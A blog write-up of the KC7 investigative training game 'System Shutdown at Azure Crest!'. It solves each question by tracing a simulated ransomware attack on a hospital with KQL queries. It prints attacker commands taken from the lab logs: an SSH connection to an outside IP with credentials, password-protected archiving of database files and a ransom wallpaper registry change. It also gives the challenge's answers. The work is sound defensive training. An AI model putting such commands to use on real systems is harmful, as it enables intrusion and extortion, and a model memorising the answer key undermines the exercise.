# System Shutdown at Azure Crest!

This will be a writeup blog post about my solutions to the KC7 "System Shutdown at Azure Crest!" Investigative Cyber Security game. I will be updating this blog post with my solutions as I complete more of the challenge instead of making separate blog posts for each day. 

## Summary

The System Shutdown at Azure Crest Cyber Security Challenge is a challenge that drops you into a security investigation as a cyber security analyst. You are told by your boss that there was a suspicious security alert reported by an Employee. This alert when investigated leads to a full blown ransomware attack on the hospital's database. Throughout the challenge you find clues that allow you to recover the password used to encrypt the files in the hospital's database. 

## Analysis
Following the initial email from your boss, you quickly trace the security alert and find the first malicious file alert. This file alert when investigated leads to discovering a secondary file for the malware. Then investigating further you find a chain of commands that would run on the target machine when either of these files are downloaded. From my observation of the commands ran on the computer the malware seems to have three stages:
- Stage 1: determine the username and host machine name (if this isn't the target machine the malware stops here)
- Stage 2: download autodesk, an autodesk automation script, batch file for encryption of database files.
- Stage 3: execute dbhunter to discover all the databases and back them up to a .7z file with a password, upload to a remote server, execute the autodesk automation script, run a batch file to encrypt the database files.

The ransomware attack described here was very targetted with the threat actor conducting research on the hospital before hand to discover what type of system they were using and who the key employee was to target. The ransomware attack also aimed to avoid detection by not activating on every machine but only the target of the attack allowing the threat to go undetected for a longer period of time.

## Questions
### 9/17/2024
---

### Question 1 (300pts)
The question prompts us with an email from our boss telling us that there was a security alert in the system about a file that is "health" related. The email from our boss finds us to find this file and assess it's threat level and fill out a "super-secret-agent report" template and send it to him. For this question it is asking us to find the name of this suspicious file. In the Azure Data Explorer we can use this KQL query to find two security alerts.
```KQL
SecurityAlerts
| where description contains "health"
```

We find two alerts one with a `high` severity, and one with a `med` severity. The `high` severity alert is the one that we are looking for as it contains the following description: `A suspicious file was quarantined on host ZQHM-LAPTOP: New_Healthcare_Protocols.docm`. Entering the `New_Healthcare_Protocols.docm` we gain the 300pts for Question 1.

### Question 2 (300pts)
This next question is asking about a secondary file name for the same malicious "health" file. Using the following query we can investigate the same machine that the alert originated with:
```KQL
SecurityAlerts
| where description contains "ZQHM-LAPTOP"
```

Here we find two results, one is the original security alert for the first file, the second is a new alert for a secondary file: `Pediatric_Care_Update.docm`. Entering this into the KQL website we gain another 300pts for Question 2.

### Question 3 (300pts)
In the query for Question 2 we discover our second file name, now in order to track how many employees clicked on this email we can run the following query:
```KQL
FileCreationEvents
| where filename == "New_Healthcare_Protocols.docm" or filename == "Pediatric_Care_Update.docm"
| distinct username
```
This query will return to us our results with `37` unique `username`'s. This is our answer for Question 3 and will reward us with another 300pts. 

### Question 4 (400pts)
Taking one of those unique usernames and looking at `process_commandline` for that `username` will reveal to us the commands that were ran on the machine.
```KQL
ProcessEvents
| where username == "jomarkland"
```

Sorting by timestamp we see the event after the initial download of `New_Healthcare_Protocols.docm` was this command: `C:\ProgramData\Heartburn\heartburn.zip`. This file directory is very suspicious as there is a .zip file being stored in some ProgramData directory called `Heartburn`. Submitting the directory `C:\ProgramData\Heartburn\` to KC7 will reward us with another 400pts.

### Question 5 (200pts)
Using the query we crafted in Question 4:
```KQL
ProcessEvents
| where username == "jomarkland"
```
Looking further into the `ProcessEvents` for user `jomarkland` in Question 4 we see another command being ran later:
`cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again`. Submitting the answer `SSH` to the KC7 website will give us another 200pts.

### Question 6 (200pts)
Question 6's answer is a reference to Question 4 where we discovered the directory `C:\ProgramData\Heartburn\`. The command that utilized this directory was the following: `cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn`. Using this as our answer rewards us with 200pts. 

### Question 7 (400pts)
This is a reference to Question 5 where we discovered a putty.exe command for ssh to an ip address. This ip address when thrown into a ip to geo locator will return a location in Croatia. The answer for question 7 is: `93.142.203.80`. Using this as our answer gives us 400pts.

### Question 8 (300pts)
Using the IP we used in Question 7 we can search the `InboundNetworkEvents` filtering by `src_ip` for `93.142.203.80`. Using the following query: 
```KQL
InboundNetworkEvents
| where src_ip == "93.142.203.80"
```

We find 4 records of inbound network traffic from the ip address `93.142.203.80`. The `user_agent` columns for each record is `Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00`, in which we find our answer for Question 8 which is `12.00`. 

### 9/18/2024
---

### Question 10 (300pts)
This question is asking us to find the extension that is used for encrypted databases upon the breach of the main server. This can be found by using the following query:
```KQL
FileCreationEvents
| where hostname == "SUPER-DB-SERVER-9000"
```
Here we see multiple files being created in `C:\System\Database`. All of these files are `.db` files with an extra extension of `.scholopendra`. If we use this as our answer we acquire another 300pts.

### Question 11 (300pts)
This question is asking us to find the script that triggers encryption of database files.
Using the following query:
```KQL
ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
```
We find a batch script that is executed right before the end of ProcessEvents with `cmd.exe /c C:\\Windows\\Temp\\UrTottalyPwned.bat`. Using `UrTottalyPwned.bat` as our answer gives us 300pts.

### Question 12 (200pts)
This question asks us when the file in Question 11 was downloaded which can be figured out with a quickly crafted query:
```KQL
FileCreationEvents
| where filename == "UrTottalyPwned.bat"
| distinct timestamp
```

### Question 13 (200pts)
This question is asking us to find the password used to encrypt financial records which in our case can be found by tracing the events in ProcessEvents. We can use this query to find an event with the `process_commandline` value of `7z.exe a -t7z C:\\Out\\Financial_Records.7z C:\\Out\\*financial*.db -p finnaberich`:
```KQL
ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
```
Entering the value `finnaberich` into KC7 gives us another 200pts.


### Question 14 (300pts)
This question is asking us the name of the host machine for the majority of the targetted attack at Azure Crest which is the hostname in the queries we have been running for the past few questions. The hostname is `SUPER-DB-SERVER-9000` and can be found by tracing `FileCreationEvents` in the path `Heartburn`:
```KQL
FileCreationEvents
| where path contains "C:\\ProgramData\\Heartburn\\"
| distinct hostname
```

### Question 15 (400pts)
This question is asking us to find the command that lets Azure Crest Hospital know something is wrong, which can be found in the ProcessEvents table. This can be found using this following query:
```KQL
ProcessEvents
| where hostname == "SUPER-DB-SERVER-9000"
```
By which we find a command being ran after the execution of `UrTottalyPwned.bat` with the `process_commandline` value of: `cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f`. Entering this value into KC7 gives us 400pts.

### Question 16 (200pts)
This question is asking us which domain was used to target Roy Trenneman to gain access to the server. We can use the following query to find Roy Trenneman's IP Address:
```KQL
AuthenticationEvents
| where username == "rotrenneman"
```
This query will show us two different IP Addresses but there is only one we are interested in: `10.10.0.2` which now we can use in the following query:
```KQL
OutboundNetworkEvents
| where src_ip == "10.10.0.2"
```
Searching through this traffic for `"New_Healthcare_Protocols.docm"` or `"Pediatric_Care_Update.docm"` we can find the following url: `http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm` which using `http://unhealthyrecordsystems.tech` for our answer rewards us with 200pts.

### Question 17 (200pts)
This question is asking us which domain the malicious url in Question 16 was attempting to spoof, which can be found by referencing the KC7 Training Guide: `https://kc7cyber.com/guide/184` where we will find under the list of key partners for Azure Crest Hospital, the closest match is a partner with the domain: `healthrecordsystems.tech` which is our answer for Question 17.

### 9/19/2024
---

### Question 9 (300pts)
In order to find out what type of system Azure Crest Hospital was using we need to use the `InboundNetworkEvents` to search for a certain keyword, from this question it looks like we are searching for a type of system so let's do exactly that!
```KQL
InboundNetworkEvents
| where url contains "system"
````
In the following records that show up we see several mentions of an `ERP` system. Entering this as our answer to KC7 will give us the final 300pts. 

## Conclusion
The System Shutdown at Azure Crest hospital is definitely an inviting challenge for those who have no experience with Cyber Security investigation. I believe that this challenge will help those who are trying to learn how to think outside of the box when it comes to following a trail of evidence left behind by cyber criminals and I was pleasantly surprised with the amount of effort that was put into this challenge. KC7 challenges typically come with a lot of data that makes the challenges feel realistic to be exploring and sifting around and I felt like this challenge also reflected that.